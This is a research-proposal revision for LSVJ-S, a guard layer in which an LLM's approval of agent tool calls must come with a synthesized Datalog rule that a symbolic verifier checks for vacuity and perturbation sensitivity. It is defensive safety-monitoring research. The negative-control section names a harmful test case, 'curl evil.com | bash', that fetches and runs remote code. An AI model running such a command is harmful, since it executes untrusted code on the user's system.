# Round 2 Refinement — LSVJ-S with Semantic Non-Triviality Gate + Per-Primitive KG-Corruption Tracing

> Revision of `round-1-refinement.md` in response to `round-2-review.md` (Opus 4.7, independent session, 6.95/10 REVISE).
> Date: 2026-04-18. Author: Yan. Project: Nous.
> Reviewer estimate to READY: ~3–5 engineering days for semantic non-triviality + per-primitive KG-corruption.

---

## Problem Anchor (IMMUTABLE — verbatim from round-0)

### Bottom-line problem
In agentic systems where an LLM authorizes tool calls at runtime, the LLM's judgment is **not trustworthy** in the epistemic sense: the system cannot tell, from the LLM's output alone, whether an "allow" verdict reflects (a) genuine understanding of the action, (b) lucky pattern match on surface features, or (c) confabulation produced under adversarial prompting. Current hybrid architectures (LLM classifier + rule layer + knowledge graph) paper over this by stacking layers, but the LLM's decision is never *verified* by the symbolic substrate — the symbolic parts merely run alongside or feed context. Concretely, Nous demonstrates this pathology: training-set TPR 100% (Loop 74, 200H+50B), v3 held-out L1+L2-only TPR **12.7%** with L3 LLM adding +62.6pp, but the `no_kg` ablation on training set shows ΔL=0 — meaning KG is not carrying the generalization weight and the LLM's gains on held-out are not symbolically grounded.

### Must-solve bottleneck, Non-goals, Constraints, Success condition
Unchanged from round-0 / round-1 (v3 → v3-HN amendment from R1 preserved). Re-stated at bottom.

---

## Anchor Check

- **Original bottleneck**: LLM allow is unverified; symbolic engine runs alongside.
- **Does revised method still address it?** Yes, now with a *semantic* non-triviality gate — the LLM's synthesized rule must demonstrably depend on primitive content, not merely reference it syntactically. This closes the vacuous-rule attack surface the Round 2 reviewer identified.
- **Reviewer suggestions rejected as drift**:
  - *Different model for Class C sub-oracle* — rejected. Same-model sealed session + schema-bound input + divergence calibration is the honest-but-bounded option; switching to a second model adds infra + cost + coordination risk without proportional epistemic gain for workshop scope. Noted as main-track Future Work.
  - *Running SFT-on-obligations baseline now* — rejected. Epistemic argument stands (SFT contaminates verifier independence).
- **Reviewer suggestions accepted**: R2 actions 1, 2, 3, 4 (split ICLR conditional), 5, 6, 7.

## Simplicity Check

- **Dominant contribution unchanged**: Synthesized Proof-Obligation (SPO) protocol + **compile-time semantic non-triviality gate** (upgraded from syntactic to behavioral).
- **Components added**: semantic non-triviality gate (~20 lines, perturbation-sensitivity test); per-primitive corruption harness with rule-level decisive-primitive tracing in `proof_trace`.
- **Components removed**: `rule_id` field; "semantic independence" as a named *property* (retained as *mitigation*).
- **Merged**: KG-empty and KG-corrupted collapsed into one ablation dimension with two conditions.
- **Rejected as complexity bloat**: SFT baseline run, different model for Class C.
- **Why still smallest adequate**: net delta from round-1 = +1 semantic gate step (~20 lines), +1 tracing field (~30 lines), +1 per-primitive ablation condition (reuses corruption utility). Removed `rule_id`. Zero new trainable components.

---

## Changes Made

### 1. Semantic non-triviality gate — behavioral, not syntactic (R2 Action 1, CRITICAL)
- **Reviewer said**: syntactic gate admits vacuous rules like `is_inner_circle(x), true_for_x := true`; run rule twice with perturbed primitive outputs; reject invariants.
- **Action**: compile-time gate now has 4 stages: (i) parse, (ii) type-check, (iii) *syntactic* non-triviality (body references ≥ 1 Class A/B primitive; head not `true`), (iv) **semantic non-triviality** — perturbation-sensitivity test.
- **Algorithm**:
  ```python
  def semantic_non_trivial(rule, live_bindings, schema, N=3, seed_pool):
      discharged_real = execute_rule(rule, live_bindings)
      for k in range(N):
          perturbed = perturb(live_bindings, rule.body_primitives, schema, seed=seed_pool[k])
          if execute_rule(rule, perturbed) != discharged_real:
              return True  # perturbation-sensitive, semantically non-trivial
      return False  # invariant across N perturbations → vacuous
  ```
  Perturbation operators: Class A → shuffle KG tuples for primitive; Class B → negate boolean return; Class C → flip pre-recorded sub-oracle output (no new LLM call).
- **Why it closes the counterexample**: vacuous rule `is_inner_circle(x), true_for_x := true, discharged := true_for_x` is invariant under perturbation → step (iv) rejects. Genuine rule depending on `is_inner_circle` flips under perturbation → admitted.
- **Impact**: ~20 lines. Per-call overhead ≤ 3 extra rule evaluations on perturbed bindings (Cozo query caching + Class C flip is free).

### 2. Per-primitive KG-corruption with rule-level decisive-primitive tracing (R2 Action 2, CRITICAL)
- **Reviewer said**: bulk Class-A shuffle conflates primitives; per-primitive corruption with rule-level tracing.
- **Action**: two parts.
  1. **Rule-level tracing**: verifier computes `decisive_primitives(rule, bindings)` per *discharged* rule = list of primitives whose binding-flip would flip `discharged` to false. If none → flag `GLOBAL_VACUOUS`, override to `confirm`. Recorded in `proof_trace.lsvj_obligations[i].binding_decisive_primitive`.
  2. **Per-primitive ablation** in Claim 2: add `corrupt_is_inner_circle_only`, `corrupt_owner_has_directed_only`, `corrupt_recipient_owned_by_owner_only`, `corrupt_action_in_precedent_only`. Each shuffles only that primitive's KG tuples; others intact. Subset analysis restricts per-primitive TPR drop to the v3-HN subset where that primitive was decisive in intact-LSVJ-S run. Wilson CI on per-primitive drop.
- **Algorithm**:
  ```python
  def decisive_primitives(rule, live_bindings):
      real = execute_rule(rule, live_bindings)
      if not real:
          return []  # not discharged
      decisive = []
      for prim in rule.body_primitives:
          flipped = flip_primitive_binding(live_bindings, prim)
          if execute_rule(rule, flipped) != real:
              decisive.append(prim.id)
      return decisive if decisive else "GLOBAL_VACUOUS"
  ```
- **Impact**: ~100 lines (tracing) + reuse of corruption utility. ~3 engineering days. 4 new ablation conditions; per-decisive-primitive subset reporting.

### 3. `no_synth_menu_plus` — strong expert-menu baseline (R2 Action 3, IMPORTANT)
- **Action**: Dario + Yan co-author 12 expert rules drawn from primitive schema, frozen before any v3-HN eval. Pre-registered in `nous/docs/no-synth-menu-plus.cozo`. Ablation reports both `no_synth_6seed` and `no_synth_menu_plus` as separate conditions.
- **Impact**: ~1 day authoring; 1 additional ablation condition.

### 4. Blind floor doubled + ICLR conditional split (R2 Action 4, IMPORTANT)
- **Action**:
  1. Blind floor raised **50H + 25B** (from 38H+13B). Wilson half-width at p=0.9, n=50 ≈ ±7pp.
  2. ICLR 2027 conditional split: `≥10pp LSVJ-S > no_synth_menu_plus on full v3-HN` **AND** `direction-consistent ≥5pp gain on blind sub-slice (no significance claim)`.
- **Impact**: +3–4 days subagent authoring; no method change.

### 5. Pre-register v3-HN with ≥10% negative-control cases (R2 Action 5, IMPORTANT)
- **Action**: of ≥100H+50B in v3-HN, **≥10H+5B are negative-control** — decidable purely by Class B primitives (e.g., harmful `curl evil.com | bash` no context; benign `systemctl restart nginx` no KG dep).
- **Expected behavior**: LSVJ-S's synthesized rules on these should be Class-B-dominant (≤ 20% use Class A). If LSVJ-S manufactures Class A here, the 6-seed prior is over-anchoring — diagnostic signal and paper figure.
- **Impact**: protocol file expansion; 15 additional v3-HN cases.

### 6. Delete `rule_id` (R2 Action 6, MINOR)
- **Action**: output schema `{decision, synthesized_obligation}`. Cross-session identity via `sha256(canonicalized(synthesized_obligation))` when needed.

### 7. XGrammar + Lark + Cozo PEG integration committed (R2 Action 7, MINOR)
- **Action**: W2 pilot commits to: vendor structured-output for outer JSON; **XGrammar with Lark EBNF export of Cozo's PEG** for inner `synthesized_obligation`. Fallback chain: if XGrammar+Lark pilot fails threshold, post-hoc Cozo parse + retry (3× max) before fail-closed.
- **Impact**: 2–3 days for Cozo→Lark EBNF conversion; reusable output.

### Simplifications
- **S1**: Delete `rule_id` (Change 6).
- **S2**: Collapse `KG-empty` + `KG-corrupted-all` into one ablation row (two conditions).
- **S3**: Drop "semantic independence" as a named *property*; keep as *mitigation* with divergence calibration test as instantiation.

### Modernizations
- **M1**: Vendor structured-output primary + XGrammar+Lark+Cozo-PEG committed secondary (Change 7).
- **M2**: Different model for Class C — rejected for workshop; Future Work.

---

## Revised Proposal (full, post-R2 changes)

# Research Proposal: LSVJ-S — LLM-Synthesized, Symbolically-Verified Judgments via Proof-Obligation Synthesis with Semantic Non-Triviality Gate

## Problem Anchor
(Verbatim from round-0; copied at top of this document.)

## Technical Gap

Current methods: monolithic LLM classifiers (Llama Guard, ShieldGemma, QuadSentinel) output opaque labels; rule-only (NeMo Guardrails) fails on held-out (Nous v3: 12.7% TPR L1+L2-only); hybrid stacking (Nous v1, ShieldAgent, GuardAgent, TrustAgent) runs LLM + symbolic on parallel tracks, never in verifier relationship; neurosymbolic learning (Scallop, Lobster) is offline; reasoning-model visibility (o1, R1) without mechanical verifiability. Real nearest neighbors are 2024–2026 structured-generation-with-rule-verification (policy-as-code, constrained-decoding tool selection) — all with *fixed* menus at authoring time.

**Smallest adequate intervention**: runtime Datalog rule synthesis + compile-time soundness gate (parse + type-check + syntactic-non-triviality + **semantic non-triviality via perturbation-sensitivity**) + Class-A/B/C-partitioned primitive schema + **decisive-primitive tracing** for causal ablation.

## Method Thesis

**One-sentence thesis (amended)**: Treat the LLM's agent decision as a conjecture bundled with a *synthesized* Datalog proof obligation; treat the Cozo engine as a compile-time-soundness-checking verifier that rejects malformed, ill-typed, syntactically-trivial, or **behaviorally-vacuous** (perturbation-invariant) rules before execution; the allow verdict survives only when the synthesized rule discharges against live facts *and* is perturbation-sensitive to its primitive inputs.

**Why smallest adequate**: reuses DeepSeek-V3.2, Cozo + parser, 46 YAML constraints, KG schema, proof_trace, markov_blanket. Adds 5 non-trainable: (1) A/B/C schema, (2) synthesis+decoder, (3) 4-stage compile-time gate, (4) verifier policy + sealed Class C runner, (5) **per-primitive corruption + decisive-primitive tracing utility**. Zero trainable.

**Why timely**: grammar-constrained decoding (XGrammar/Lark/Cozo PEG), LLM-for-program-synthesis, 2026 agent governance demand.

## Contribution Focus

### Dominant contribution
**Synthesized Proof-Obligation (SPO) protocol + 4-stage compile-time gate (parse + type-check + syntactic + semantic non-triviality) + decisive-primitive tracing**, demonstrated on runtime agent decisions. Evidence: v3-HN with ablations separating synthesis from strong expert menu, per-primitive KG-corruption causality, Class A/B/C contribution attribution, negative-control diagnostic.

### Supporting contribution
Verifier-proposer separation as audit property (bounded via Class C sealed sub-oracle); honest labeling of sealed-same-model limits.

### Explicit non-contributions
(Unchanged.) No new LLM/training/RL/PRM; not a new benchmark; not a new symbolic reasoner; not a security-robustness paper; not universal LLM trustworthiness. 6-seed library = prior, not contribution.

## Proposed Method

### Complexity Budget

- **Frozen/reused**: DeepSeek-V3.2, GPT-5.4, Cozo, 46 YAML constraints, L1/L2/L4, proof_trace, markov_blanket.
- **New non-trainable (5)**: schema with A/B/C, synthesis+decoder, 4-stage compile-time gate, verifier policy + sealed Class C runner, **per-primitive corruption + decisive-primitive tracing**.
- **New trainable**: 0.
- **Not used**: new LLM, differentiable Datalog, PRM/RL, L1/L2/L4 changes, SFT-on-obligations (epistemic rejection), different model for Class C (Future Work).

### System Overview

```
tool_call
  ↓
L1 (Datalog): hard-block → exit
  ↓
L2 (Triviality): benign pass-through → exit
  ↓
L3-LSVJ-S:
  (a) Proposer (DeepSeek-V3.2, grammar-constrained)
       → { decision, synthesized_obligation: CozoScript rule }
  (b) Compile-time gate (4 stages):
       (b.1) parse → confirm on parse error
       (b.2) type-check against schema → confirm on type error
       (b.3) syntactic non-triviality → confirm on fail
       (b.4) SEMANTIC non-triviality (N=3 perturbation-sensitivity) → confirm on vacuous
  (c) Execute against live bindings:
       Class A → Cozo Datalog over KG
       Class B → deterministic host function / Cozo built-in
       Class C → sealed sub-oracle (fresh session, schema-bound input)
  (d) Compute decisive_primitives per discharged rule → record in proof_trace
       (if GLOBAL_VACUOUS → override to confirm + log)
  (e) Verify policy:
       LLM block → accept block
       LLM confirm → accept confirm
       LLM allow + rule discharges + perturbation-sensitive + decisive primitives exist → allow
       otherwise → upgrade to confirm
  ↓
L4 (Post-Gate Verifier): regex info-flow audit (unchanged)
  ↓
Final verdict + proof_trace { rule_text, class_usage, discharge_result, binding_decisive_primitive }
```

**Key property**: L1, L2, L4 untouched. `no_synth_6seed` / `no_synth_menu_plus` / `no_sem_gate` / per-primitive ablations recoverable by config flags; no code fork.

### Representation: Synthesized Obligations

(Schema unchanged from round-1.)
```
?[discharged] := <body>, discharged = <boolean expr over body bindings>
```

**6-seed library (prior, not contribution)**: `no_credential_exfil` / `no_inner_circle_disclosure` / `no_infra_expose` / `no_destructive_without_directive` / `no_hijacking_via_external_content` / `owner_directed_send`.

**12-rule `no_synth_menu_plus` expert menu (new baseline)**: 6 seeds + 6 additional rules covering `credentials_in_log_redacted`, `destructive_dryrun_unless_confirmed`, `infra_endpoint_without_auth`, `inner_circle_public_context_ok`, `hijacking_mitigated_by_audit_trail`, `autonomy_bounded_action_list`. Pre-registered in `nous/docs/no-synth-menu-plus.cozo` before eval.

### Semantic Non-Triviality Gate (new)

**Purpose**: prevent LLM satisfying syntactic gates while writing rules whose discharge does not depend on primitive content.

```python
def semantic_non_trivial(rule, live_bindings, schema, N=3, seed_pool) -> bool:
    discharged_real = execute_rule(rule, live_bindings)
    for k in range(N):
        perturbed = perturb(live_bindings, rule.body_primitives, schema, seed=seed_pool[k])
        if execute_rule(rule, perturbed) != discharged_real:
            return True  # perturbation-sensitive
    return False  # invariant → vacuous
```

**Perturbation operators**:
- Class A: reshuffle primitive's matching tuples (preserve schema/arity, break semantic correspondence).
- Class B: negate boolean return.
- Class C: flip pre-recorded sub-oracle output (no additional LLM call).

**N=3 calibration**: false-rejection rate on hand-labeled reference set ≤ 10% (Week 3 pilot); raise N if needed.

**Cost**: ≤ 3 extra rule evaluations per call. Class A Cozo-cached; Class B O(1); Class C free (flip pre-recorded). Per-call +10–30ms overhead.

### Decisive-Primitive Tracing (new)

```python
def decisive_primitives(rule, live_bindings) -> list[str] | "GLOBAL_VACUOUS":
    real = execute_rule(rule, live_bindings)
    if not real:
        return []  # not discharged
    decisive = []
    for prim in rule.body_primitives:
        flipped = flip_primitive_binding(live_bindings, prim)
        if execute_rule(rule, flipped) != real:
            decisive.append(prim.id)
    return decisive if decisive else "GLOBAL_VACUOUS"
```

`GLOBAL_VACUOUS` rules (discharge invariant to any single primitive flip) trigger fail-closed `confirm` + log.

### Training Plan
**None.** Zero-shot synthesis via grammar-constrained decoding + few-shot seeds. SFT-on-obligations named but rejected on epistemic grounds (contaminates verifier independence).

### Inference Path
1. Parse `ToolCall`.
2. L1; exit if match.
3. L2; exit if trivial.
4. **Synthesis**: proposer call + grammar-constrained decoder → `{decision, synthesized_obligation}`.
5. **Compile-time gate (4 stages)**: parse → type-check → syntactic non-triviality → semantic non-triviality. Any failure → `confirm` + `gate_fail_reason` logged.
6. **Execute**: Class A via Cozo; Class B via host; Class C via sealed sub-oracle.
7. **Decisive-primitive tracing**: compute, record in proof_trace; `GLOBAL_VACUOUS` → confirm + log.
8. **Verify policy** applies.
9. L4 unchanged.
10. Final verdict + decision_log.

### Why Mechanism Stays Small
Same LLM, same symbolic engine, same KG, 5 new non-trainable components, zero training. Power from runtime synthesis + 4-stage compile-time gate + decisive-primitive tracing.

### Frontier-Primitive Leverage
- **LLM as runtime Datalog rule synthesizer**, grammar-constrained.
- **Grammar-constrained decoding**: XGrammar + Lark + Cozo PEG (committed), vendor JSON outer (primary). Target parse-failure < 0.5%.
- **Compile-time gate with behavioral non-triviality**: 4-stage soundness gate; perturbation-sensitivity test is the specific property that separates LSVJ-S from structured-tool-use safety gates.

### Failure Modes and Diagnostics

(Extended from round-1 with 2 new rows.)

| Mode | Detect | Mitigate |
|---|---|---|
| Parse / type / syntactic-trivial failure | compile-time gate stages 1–3 | fail-closed → confirm |
| **Semantic-trivial (rule invariant to perturbation)** | **stage 4 gate** | **fail-closed → confirm; log vacuous rule for prompt iteration** |
| Class A returns inconclusive | empty Cozo relation | undischarged → confirm |
| Class B returns no-match | deterministic | undischarged → confirm |
| Class C ambiguous | JSON schema mismatch | fail-closed, prompt iteration |
| Class C drift | session-isolation CI lint | test fail on leakage |
| **GLOBAL_VACUOUS rule (discharge invariant to any single-primitive flip)** | **decisive-primitive tracing returns empty** | **override to confirm + log pathological rule** |
| Seed over-anchoring | verbatim-match coverage ≤ 30% + negative-control diagnostic (≥80% Class-B-dominant on neg-control) | weaken few-shot if breach |
| Verifier latency | per-class budgets + semantic gate N=3 budget | degrade with `degraded=true` |

### Novelty Argument
(Unchanged structure; amended emphasis.) The specific novelty lift is the 4-stage compile-time gate with **behavioral non-triviality** (perturbation-sensitivity) — no prior agent-safety system we are aware of requires synthesized rules to pass a behavioral-sensitivity check. This is the property that separates LSVJ-S from both constrained-decoding-with-menu and structured-tool-use-with-rules. The per-primitive decisive-tracing enables causal attribution at the entity level, strengthening the KG "not stage scenery" claim from population-level to entity-level evidence.

## Claim-Driven Validation Sketch

### Claim 1 (Dominant, revised): LSVJ-S beats the strongest non-LSVJ-S baseline including an expert-curated menu.
- **Metric**: TPR on v3-HN (≥100H+50B, with ≥50H+25B blind, ≥10H+5B neg-control); per-category Wilson 95% CI.
- **Configs (5)**: LLM-only / Rules-only / Nous current / **`no_synth_menu_plus`** / **LSVJ-S**.
- **Expected**: LSVJ-S > `no_synth_menu_plus` > Nous current. Direction-consistency on blind.
- **Table 1**: 5-config main table.

### Claim 2 (Supporting, revised): LSVJ-S gains are mechanism-level (synthesis + semantic gate + per-primitive KG).
- **Configs**:
  - full LSVJ-S
  - `no_synth_6seed` (fallback to 6-seed menu)
  - `no_synth_menu_plus` (Claim 1 baseline, also Claim 2 ablation)
  - **`no_sem_gate`** (disable stage b.4; measure false-allow rate on v3-HN neg-control)
  - `no_class_A`, `no_class_B`, `no_class_C`
  - `KG-shuffled-all` / `KG-empty` (one dimension, two conditions)
  - **`corrupt_is_inner_circle_only`**, **`corrupt_owner_has_directed_only`**, **`corrupt_recipient_owned_by_owner_only`**, **`corrupt_action_in_precedent_only`** (per-primitive; subset = decisive-primitive cases).
- **Metric**: per-category TPR/FPR; ΔL from full; false-allow rate for `no_sem_gate`; per-primitive TPR drop with Wilson CI on decisive subset.
- **Expected**:
  - `no_synth_6seed` < full AND `no_synth_menu_plus` < full → synthesis > strong menu.
  - `no_sem_gate` shows ≥ 3pp false-allow increase on neg-control → semantic gate load-bearing.
  - ≥ 2/4 Class A primitives show per-primitive TPR drop > 5pp on decisive subset.
- **Tables 2+3**: LSVJ-S ablation; per-primitive KG-corruption.

### Claim 3 (Stretch): ShieldAgent-Bench zero-shot.
(Unchanged — not gated for workshop.)

## Experiment Handoff Inputs

### Must-prove
1. LSVJ-S > `no_synth_menu_plus` on v3-HN full + direction-consistent on blind.
2. `no_sem_gate` false-allow rate ≥ 3pp increase on neg-control.
3. Per-primitive: ≥ 2/4 Class A primitives show > 5pp TPR drop on decisive subset.
4. Neg-control cases elicit Class-B-dominant rules (≤ 20% Class A usage).

### Must-run ablations
LSVJ-S full; `no_synth_6seed`; `no_synth_menu_plus`; `no_sem_gate`; `no_class_A`; `no_class_B`; `no_class_C`; `KG-shuffled-all`; `KG-empty`; 4× per-primitive.
Baselines: LLM-only, Rules-only, Nous current.

### Critical datasets / metrics
- **Primary**: v3-HN (≥100H+50B, ≥50H+25B blind, ≥10H+5B neg-control).
- **Reference**: v3, AgentHarm.
- **Stretch**: ShieldAgent-Bench.
- **Metrics**: TPR/FPR + Wilson CI, ΔL, false-allow rate, per-primitive TPR drop, parse-failure, class usage, decisive-primitive distribution, latency.

### Highest-risk assumptions
1. Grammar-constrained synthesis ≥ 99% parse rate (W2 pilot).
2. Seed library non-over-anchoring: verbatim-match ≤ 30%; neg-control Class-B-dominant ≥ 80%.
3. Class C sealed independence: CI lint + divergence calibration passes.
4. **Semantic non-triviality false-rejection ≤ 10%** (W3 pilot).
5. **Decisive-primitive tracing stable** (deterministic modulo KG seed).
6. **Per-primitive corruption: ≥ 2/4 primitives show ≥ 5pp delta** — otherwise Claim 2.3 weakens; honest fallback.
7. Blind 50H+25B feasible (~5–6 subagent days).

## Compute & Timeline

### Engineering (weeks 1–5, +1 week from round-1)
- W1: schema with A/B/C; 2 Class A + 2 Class B primitives; unit tests.
- W2: synthesis + grammar-constrained decoder (XGrammar + Lark + Cozo-PEG); 500-call pilot.
- W3: **4-stage compile-time gate incl. semantic non-triviality**; remaining primitives incl 3 Class C; sealed plumbing + CI lint.
- W4: **decisive-primitive tracing; per-primitive corruption harness**; verifier policy; `no_synth_menu_plus` 12-rule menu authored+frozen.
- W5: v3-HN authoring (50% author + 50% blind, 10% neg-control); integration tests.

### Experiments (weeks 6–7)
- W6: Claim 1 (5 configs × v3-HN full + blind). API ~$40.
- W7: Claim 2 (11+ conditions × subsets + per-primitive). API ~$80.

### Paper (week 8+)
- Rewrite Sections 2–4. Tables 1–3 (main + ablation + per-primitive). Figure 2 (4-stage gate). Figure 3 (per-primitive bar chart). auto-review-loop to ARIS ≥ 8.5.

### Totals
- Engineering: ~200 hours (+40 from round-1; adds semantic gate, tracing, per-primitive, menu-plus, expanded blind).
- API budget: ≤ $150.
- GPU: 0.
- Wall-clock to workshop submission: 10 weeks nominal; 12–14 with review cycles.

## Risks and Open Questions

1. **Semantic gate false-rejection > 10%**: adjust N or weaken perturbation strength.
2. **Synthesis still seed-anchored on neg-control**: if neg-control elicits Class A usage, confirmation bias in v3-HN exposed. Honest: report, narrate.
3. **Decisive-primitive ambiguity under multi-decisive rules**: `binding_decisive_primitive` may be list; per-primitive ablation handles sole-decisive vs jointly-decisive separately in analysis.
4. **Blind author (Sonnet 4.6) shares biases with proposer**: measure case-content distance blind↔author-constructed; if small, human collaborator authoring post-workshop.
5. **Per-primitive Class A shows no delta on some primitives** (e.g., `action_in_precedent` may not carry weight): honest narration; informs future KG seeding priorities.
6. **GLOBAL_VACUOUS rules > 5% of proposer output**: indicates synthesis routinely fails semantic gate; indicates prompt needs refinement or seed library inadequate.

---

## Success Condition (carry-forward with R1 + R2 amendments)

Dongcheng will say "yes, this is trustworthy reasoning, not dressed-up pattern matching" iff **all four** hold:

1. **Held-out improvement is real** — on **v3-HN (R1 amendment)**, LSVJ-S beats **`no_synth_menu_plus` (R2 amendment)** by statistically significant margin on Wilson CI; direction-consistent on blind sub-slice (≥ 5pp).
2. **Gain is mechanism-level** at three loci:
   - `no_synth_menu_plus` < full → synthesis contributes over expert menu.
   - `no_sem_gate` increases false-allow rate on negative-control cases → semantic non-triviality gate is load-bearing.
   - Per-class ablation (`no_class_A/B/C`) each non-zero.
3. **KG contributes causally per-primitive**: ≥ 2 of 4 Class A primitives show per-primitive TPR drop > 5pp on decisive subset.
4. **Zero-shot transfer defensible** (demoted to stretch; required for main-track): ShieldAgent-Bench within 5pp, or honest Future-Work narration.

If any of 1–3 fails, revise or reject — not reframe to hide. (4) may fail gracefully into Future Work.

---

*End of round-2 refinement.*
